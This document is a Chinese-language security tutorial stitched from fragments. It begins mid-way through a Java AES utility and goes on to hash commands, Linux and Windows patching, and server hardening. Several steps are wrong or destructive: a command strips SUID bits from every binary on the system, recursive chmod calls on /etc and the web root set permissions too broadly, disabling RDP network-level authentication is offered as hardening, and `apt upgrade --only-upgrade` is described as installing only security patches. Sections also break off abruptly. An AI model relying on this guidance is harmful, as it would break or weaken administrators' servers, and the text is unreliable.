    private static byte[] generateIV() {
        byte[] iv = new byte[IV_LENGTH];
        new SecureRandom().nextBytes(iv);
        return iv;
    }

    /**
     * AES加密
     * @param data 待加密明文
     * @param keySeed 密钥种子
     * @return Base64编码的加密结果（IV+加密数据）
     */
    public static String encrypt(String data, String keySeed) {
        try {
            SecretKeySpec key = generateKey(keySeed);
            byte[] iv = generateIV();
            IvParameterSpec ivSpec = new IvParameterSpec(iv);

            Cipher cipher = Cipher.getInstance(ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);

            byte[] encryptedData = cipher.doFinal(data.getBytes("UTF-8"));
            // 拼接IV和加密数据
            byte[] result = new byte[iv.length + encryptedData.length];
            System.arraycopy(iv, 0, result, 0, iv.length);
            System.arraycopy(encryptedData, 0, result, iv.length, encryptedData.length);

            return Base64.getEncoder().encodeToString(result);
        } catch (Exception e) {
            throw new RuntimeException("AES加密失败", e);
        }
    }

    /**
     * AES解密
     * @param encryptedData Base64编码的加密数据（IV+加密数据）
     * @param keySeed 密钥种子
     * @return 解密后的明文
     */
    public static String decrypt(String encryptedData, String keySeed) {
        try {
            SecretKeySpec key = generateKey(keySeed);
            byte[] resultBytes = Base64.getDecoder().decode(encryptedData);

            // 提取IV（前16位）
            byte[] iv = new byte[IV_LENGTH];
            System.arraycopy(resultBytes, 0, iv, 0, iv.length);
            IvParameterSpec ivSpec = new IvParameterSpec(iv);

            // 提取加密数据（剩余部分）
            byte[] encryptedBytes = new byte[resultBytes.length - iv.length];
            System.arraycopy(resultBytes, iv.length, encryptedBytes, 0, encryptedBytes.length);

            Cipher cipher = Cipher.getInstance(ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);

            byte[] decryptedData = cipher.doFinal(encryptedBytes);
            return new String(decryptedData, "UTF-8");
        } catch (Exception e) {
            throw new RuntimeException("AES解密失败", e);
        }
    }

    // 测试
    public static void main(String[] args) {
        String keySeed = "FengYeSecurity2024!"; // 密钥种子（生产环境需保密）
        String originalData = "用户敏感数据：手机号138****1234，身份证号110****5678";

        String encrypted = encrypt(originalData, keySeed);
        System.out.println("加密后：" + encrypted);

        String decrypted = decrypt(encrypted, keySeed);
        System.out.println("解密后：" + decrypted);
    }

# 3. 生成哈希校验文件（便于批量验证）
sha256sum important_file1.tar.gz important_file2.tar.gz > file_checksum.sha256

# 4. 验证文件哈希（检查文件是否完整）
sha256sum -c file_checksum.sha256
# 输出格式：文件名: OK（完整）/ FAILED（被篡改）

# 5. bcrypt哈希密码（Linux命令行）
htpasswd -nbBC 12 "" User@123456 | tr -d ':\n'
# 输出bcrypt哈希值（去除前缀和冒号）

四、数据加密核心注意事项（安全避坑）

  • 密钥管理是关键：对称加密的密钥、非对称加密的私钥需严格保密，避免硬编码在代码中，可存储在环境变量、密钥管理服务（如阿里云KMS）；
  • 选择安全算法：避免使用DES、3DES、AES-128以下、MD5、SHA-1等过时算法，优先选择AES-256、RSA-2048+/4096、bcrypt、Argon2；
  • 加密模式选择：AES推荐使用CBC/GCM模式（GCM更安全，支持认证），避免ECB模式（不安全）；
  • 加盐处理：对称加密和哈希加密需添加随机盐值，防止彩虹表破解；
  • 数据分段：RSA加密单个数据块大小有限（2048位RSA最多加密245字节），长数据需分段加密或结合AES加密；
  • 定期更新密钥：核心业务的加密密钥建议定期更换（如每6个月），更换时需平滑过渡，避免数据无法解密。

系统补丁管理教程（Linux/Windows，防御已知漏洞）

核心价值：及时安装系统和软件补丁是防御已知漏洞的最有效手段，90%以上的黑客攻击利用的是未修复的已知漏洞（如Log4j、Heartbleed），补丁管理是安全防护的基础。

一、Linux系统补丁更新（Debian/Ubuntu，实操）

Debian/Ubuntu系统通过apt命令管理软件包和补丁，以下为实操指令，带详细注释：

# 1. 更新软件源列表（获取最新的软件包和补丁信息）
apt update
# 注释：仅更新源列表，不安装补丁

# 2. 查看可更新的软件包和补丁
apt list --upgradable
# 输出格式：软件包名/版本号/更新源，可查看哪些软件有可用补丁

# 3. 安装所有安全补丁和软件更新（推荐，生产环境建议先测试）
apt upgrade -y
# -y：自动确认安装，无需手动输入y
# 注释：升级所有已安装软件包，包含安全补丁和功能更新

# 4. 仅安装安全补丁（不升级功能，更稳定，生产环境首选）
apt upgrade -y --only-upgrade -s  # -s表示模拟安装，查看将安装的补丁
apt upgrade -y --only-upgrade     # 实际安装安全补丁

# 5. 升级系统版本（如Ubuntu 20.04→22.04，含内核补丁，需谨慎）
apt dist-upgrade -y
# 注释：会升级内核、依赖关系复杂的软件包，可能导致兼容性问题，生产环境需先在测试机验证

# 6. 清理无用软件包和缓存（节省磁盘空间）
apt autoremove -y  # 卸载不再需要的依赖包
apt clean          # 清理apt缓存的软件包文件

# 7. 检查内核版本（内核补丁安装后需重启生效）
uname -r
# 查看已安装的内核版本列表
dpkg --list | grep linux-image

# 8. 重启系统（内核、核心服务补丁生效必需）
reboot
# 生产环境建议在非业务高峰重启，避免影响业务

# 9. 禁止特定软件包更新（如需保持旧版本兼容性）
apt-mark hold apache2  # 禁止Apache更新
apt-mark unhold apache2  # 取消禁止，允许更新

  1. 打开设置：按下Win+I，或通过"控制面板→系统和安全→Windows Update"；
  2. 检查更新：点击"检查更新"，系统自动搜索可用补丁；
  3. 安装补丁：搜索完成后，点击"下载并安装"，等待补丁下载安装（需联网）；
  4. 重启系统：部分补丁（如内核、安全组件）需重启生效，点击"立即重启"；
    5. 2. 命令行方式（PowerShell，适合服务器批量操作） 
    # 1. 以管理员身份打开PowerShell（右键开始菜单→Windows PowerShell(管理员)）

# 2. 检查可用更新
Get-WindowsUpdate

    四、自动化补丁管理（企业级，高效运维）

    手动更新补丁效率低，适合单台服务器，企业级环境建议通过自动化工具实现批量更新，以下为实操方案：

    1. Linux自动化补丁（Cron定时任务）

    创建定时任务，在非业务高峰自动更新补丁，示例（Debian/Ubuntu）：

    # 1. 编辑crontab定时任务
crontab -e
# 2. 添加以下内容（每周日凌晨3点自动更新补丁，适合非业务高峰）
0 3 * * 0 /usr/bin/apt update && /usr/bin/apt upgrade -y --only-upgrade && /usr/bin/apt autoremove -y > /var/log/patch_update.log 2>&1
# 注释：
# 0 3 * * 0：每周日凌晨3点执行
# > /var/log/patch_update.log 2>&1：将输出日志保存到/var/log/patch_update.log，便于排查问题
# CentOS/RHEL替换为：
0 3 * * 0 /usr/bin/yum update -y --security > /var/log/patch_update.log 2>&1

# 3. 查看定时任务
crontab -l

# 4. 手动测试定时任务脚本
/bin/bash -c "/usr/bin/apt update && /usr/bin/apt upgrade -y --only-upgrade && /usr/bin/apt autoremove -y"

    2. Windows自动化补丁（组策略/GPO）

    Windows Server通过组策略（GPO）统一管理域内计算机的补丁更新，步骤：

    1. 打开组策略管理控制台：运行gpmc.msc；
    2. 创建新的组策略对象（GPO）：右键域名→"创建GPO在这个域中并在此处链接它"，命名为"自动补丁更新"；
    3. 编辑GPO：右键新创建的GPO→"编辑"，导航到"计算机配置→策略→管理模板→Windows组件→Windows Update"；
    4. 配置自动更新：
      • 启用"配置自动更新"，选择更新方式（如"4 - 自动下载并计划安装"）；
      • 设置计划安装时间（如每周日凌晨3点）；
      • 启用"自动更新检测频率"，设置检测间隔（如1天）。
    5. 应用GPO：将GPO链接到需要自动更新的组织单元（OU），域内计算机将在下次组策略刷新后应用配置。

    3. 企业级补丁管理工具（适合大规模集群）

    • Linux：Spacewalk、Foreman（开源），支持批量补丁部署、版本控制、合规审计；
    • Windows：WSUS（Windows Server Update Services，微软官方），集中管理Windows补丁，控制更新时间和范围；
    • 跨平台：IBM BigFix、SolarWinds Patch Manager（商业工具），支持Linux/Windows/macOS等多系统补丁管理。

    五、补丁管理核心注意事项（避坑指南）

    • 更新前备份：更新补丁前备份系统配置文件和核心数据，避免补丁兼容性问题导致业务中断；
    • 测试环境验证：生产环境补丁更新前，先在测试环境验证补丁的兼容性和稳定性，确认无问题后再部署；
    • 制定回滚方案：针对核心业务系统，提前制定补丁回滚方案（如卸载补丁、恢复备份），若补丁引发问题可快速恢复；
    • 关注安全公告：及时关注厂商安全公告（如微软MSRC、Linux内核官网），高危漏洞（如远程代码执行）需优先紧急修复；
    • 禁止关闭自动更新：核心服务器禁止关闭自动更新功能，可调整更新时间为非业务高峰，确保及时获取补丁；
    • 定期审计：定期检查服务器补丁安装情况，排查未安装的高危补丁，形成审计报告。

服务器安全配置教程（Linux/Windows，全方位加固）

重要提示：以下配置需在测试环境验证后，再应用到生产环境，避免误配置导致服务不可用；核心原则：最小权限、关闭无用服务、强化认证、日志审计。

一、Linux服务器基础安全加固（核心配置）

1. 账号安全加固（禁止root登录，创建普通用户）

# 1. 创建普通用户（用于日常登录和管理，禁止root直接登录）
useradd -m secure_user  # -m创建用户家目录
passwd secure_user       # 设置用户密码（建议复杂度高：大小写字母+数字+特殊字符）

# 2. 授予普通用户sudo权限（执行管理员命令）
usermod -aG sudo secure_user  # Debian/Ubuntu
usermod -aG wheel secure_user # CentOS/RHEL

# 3. 验证sudo权限（切换到普通用户测试）
su - secure_user
sudo ls /root  # 输入普通用户密码，能执行则表示权限生效

# 4. 禁用root SSH登录（编辑SSH配置文件）
vim /etc/ssh/sshd_config
# 修改以下配置项：
PermitRootLogin no          # 禁用root直接登录SSH
PasswordAuthentication yes  # 暂时保留密码登录（测试普通用户登录成功后可改为no）
PubkeyAuthentication yes    # 启用SSH密钥登录（更安全）
MaxAuthTries 3              # 最大认证尝试次数（防止暴力破解）
ClientAliveInterval 300     # 5分钟无活动则断开连接
ClientAliveCountMax 0       # 无活动直接断开，不重试

# 5. 重启SSH服务使配置生效
systemctl restart sshd      # Debian/Ubuntu/CentOS 7+
service ssh restart         # 旧版Debian/Ubuntu

# 6. 测试普通用户登录（本地终端或远程工具）
ssh secure_user@服务器IP -p 22
sudo -i  # 切换到root用户（需输入普通用户密码）

2. SSH密钥登录配置（替代密码，最安全）

# 1. 客户端生成SSH密钥对（本地电脑，Windows/Linux/Mac）
ssh-keygen -t ed25519 -C "secure_user@fengye-server"
# 注释：
# -t ed25519：推荐的密钥算法，比RSA更安全高效；若系统不支持，可替换为ssh-keygen -t rsa -b 4096
# 执行后按回车，默认保存到~/.ssh/id_ed25519（私钥）和~/.ssh/id_ed25519.pub（公钥），无需设置密码（或设置密钥密码）

# 2. 将公钥上传到服务器（客户端执行）
ssh-copy-id -i ~/.ssh/id_ed25519.pub secure_user@服务器IP -p 22
# 输入secure_user的密码，公钥将自动上传到服务器~/.ssh/authorized_keys

# 3. 服务器端验证公钥配置（确保权限正确，否则密钥登录失败）
su - secure_user
mkdir -p ~/.ssh  # 确保.ssh目录存在
chmod 700 ~/.ssh  # 目录权限必须为700（仅所有者可读可写可执行）
chmod 600 ~/.ssh/authorized_keys  # 公钥文件权限必须为600（仅所有者可读可写）
cat ~/.ssh/authorized_keys  # 查看已上传的公钥

# 4. 禁用密码登录（确认密钥登录可用后）
vim /etc/ssh/sshd_config
PasswordAuthentication no  # 禁用密码登录，仅允许密钥登录
systemctl restart sshd

# 5. 测试密钥登录（客户端执行，无需输入密码）
ssh secure_user@服务器IP -p 22 -i ~/.ssh/id_ed25519

3. 关闭无用服务（减少攻击面）

# 1. 查看正在运行的服务（Debian/Ubuntu）
systemctl list-unit-files --type=service --state=enabled
# CentOS/RHEL
systemctl list-unit-files --type=service --state=enabled

# 2. 关闭并禁用无用服务（示例：telnet、rpcbind、cups等）
# 关闭telnet服务
systemctl stop telnet.socket
systemctl disable telnet.socket
# 关闭rpcbind服务
systemctl stop rpcbind
systemctl disable rpcbind
# 关闭cups服务（打印机服务，服务器一般无需）
systemctl stop cups
systemctl disable cups

# 3. 验证服务状态（确认已停止）
systemctl status telnet.socket
systemctl is-enabled telnet.socket  # 输出disabled表示已禁用

# 4. 禁止无用端口监听（查看端口监听情况）
netstat -tulpn  # 列出所有监听的TCP/UDP端口
ss -tulpn       # 同netstat，部分系统默认无netstat，需安装：apt install net-tools

4. 文件权限加固（防止未授权访问和篡改）

# 1. 核心系统目录权限配置（仅root可修改）
chmod -R 755 /etc  # /etc目录（系统配置）：所有者rwx，其他rx
chown -R root:root /etc  # 确保属主为root
chmod 600 /etc/shadow  # 密码文件：仅root可读可写
chmod 644 /etc/passwd  # 用户信息文件：所有人可读，root可写

# 2. 系统命令目录权限配置
chmod -R 755 /bin /sbin /usr/bin /usr/sbin  # 系统命令：所有者rwx，其他rx
chown -R root:root /bin /sbin /usr/bin /usr/sbin

# 3. Web目录权限配置（以Nginx为例）
chown -R www-data:www-data /var/www/html  # Debian/Ubuntu，属主为Web服务用户
chown -R apache:apache /var/www/html      # CentOS/RHEL
chmod -R 755 /var/www/html                # 目录权限：rwxr-xr-x（仅所有者可写）
chmod -R 644 /var/www/html/*              # 文件权限：rw-r--r--（禁止执行）

# 4. 禁止敏感文件SUID/SGID权限（防止提权）
find / -perm -4000 -o -perm -2000 -print0 | xargs -0 chmod -s 2>/dev/null
# 注释：SUID/SGID权限允许用户以文件属主身份执行，可能被用于权限提升，非必要禁止

5. 内核参数加固（sysctl配置，防御网络攻击）

# 1. 编辑sysctl配置文件
vim /etc/sysctl.conf
# 2. 添加以下加固参数（复制粘贴，覆盖原有相关参数）
# 禁止IP转发（非路由器无需转发）
net.ipv4.ip_forward = 0
# 禁止源路由（防止IP欺骗）
net.ipv4.conf.all.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0
# 禁止ICMP重定向（防止路由欺骗）
net.ipv4.conf.all.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
# 启用源地址验证（防止IP伪造）
net.ipv4.conf.all.rp_filter = 1
# 启用SYN Cookie（防御SYN洪水攻击）
net.ipv4.tcp_syncookies = 1
# 限制SYN队列大小（默认1024，调整为2048）
net.ipv4.tcp_max_syn_backlog = 2048
# 防护ICMP广播风暴
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
# 禁止发送ICMP重定向
net.ipv4.conf.all.send_redirects = 0
# 限制端口扫描（防止TCP TIME_WAIT攻击）
net.ipv4.tcp_rfc1337 = 1
# 优化TCP连接回收
net.ipv4.tcp_tw_recycle = 0
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 10
# 禁用IPv6（若不使用IPv6，减少攻击面）
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1

# 3. 使内核参数生效
sysctl -p
# CentOS/RHEL额外执行（永久生效）
sysctl --system

# 4. 验证参数是否生效（示例）
sysctl net.ipv4.tcp_syncookies  # 输出net.ipv4.tcp_syncookies = 1表示生效

二、Windows服务器基础安全加固（核心配置）

1. 账号安全加固

  1. 禁用默认管理员账号（Administrator）：计算机管理→本地用户和组→用户→右键Administrator→属性→勾选"账户已禁用"；
  2. 创建新的管理员账号：右键"用户"→新用户→设置复杂密码（大小写字母+数字+特殊字符），加入"Administrators"组；
  3. 启用密码策略：本地安全策略→账户策略→密码策略→启用"密码必须符合复杂性要求"、"密码长度最小值"（设为8位）、"密码最长使用期限"（设为90天）；
  4. 启用账户锁定策略：本地安全策略→账户策略→账户锁定策略→设置"账户锁定阈值"（5次）、"账户锁定时间"（30分钟）。

2. 关闭无用服务和端口

  1. 打开服务管理器：运行services.msc；
  2. 禁用无用服务：如"Telnet"、"Remote Registry"（远程注册表，高危）、"Print Spooler"（打印机服务）、"Server"（文件共享服务，无需则禁用），右键服务→属性→启动类型设为"禁用"，点击"停止"；
  3. 配置Windows防火墙：控制面板→Windows Defender防火墙→高级设置→入站规则→禁用所有不必要的端口，仅开放业务所需端口（如80、443、3389（远程桌面，如需））。

3. 远程桌面（RDP）安全加固

  1. 修改远程桌面默认端口（3389）：注册表编辑器→HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp→修改"PortNumber"为自定义端口（如33890，十进制）；HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp→同样修改"PortNumber"；
  2. 禁用网络级别身份验证（NLA）：远程桌面设置→高级→设置→取消勾选"允许网络级别身份验证"（如需，根据安全需求选择）；
  3. 限制远程登录用户：本地安全策略→本地策略→用户权限分配→"允许通过远程桌面服务登录"→仅保留必要的管理员账号。

4. 开启审计日志

  1. 本地安全策略→本地策略→审核策略→启用"审核登录事件"（成功+失败）、"审核账户管理"（成功+失败）、"审核对象访问"（失败）、"审核特权使用"（失败）；
  2. 事件查看器→Windows日志→安全→定期查看登录失败、账户变更等事件，及时发现异常。

cat /var/log/lynis-report.dat

# 4. 修复报告中的高危问题

2. Windows安全审计工具（Microsoft Baseline Security Analyzer，MBSA）

  1. 下载MBSA：从微软官网下载MBSA工具（支持Windows 10/Server 2016+）；
  2. 运行审计：打开MBSA→点击"扫描一台计算机"→输入本地计算机名或IP→勾选"安全更新"、"密码策略"、"安全配置"等扫描项→点击"开始扫描"；
  3. 查看报告：扫描完成后，查看"高风险"项，按提示修复（如未安装的高危补丁、弱密码、不安全的服务配置）。

四、服务器安全核心原则

  • 最小权限原则：所有账号、服务、端口仅授予必要的权限，关闭无用功能；
  • 纵深防御原则：结合防火墙、补丁更新、密码策略、日志审计、数据加密等多层防护；
  • 定期备份原则：核心数据定期备份（本地+异地），防止数据丢失或勒索病毒攻击；
  • 持续监控原则：实时监控服务器日志、进程、网络流量，及时发现异常行为；
  • 合规审计原则：定期进行安全审计，确保服务器配置符合安全标准和法规要求。
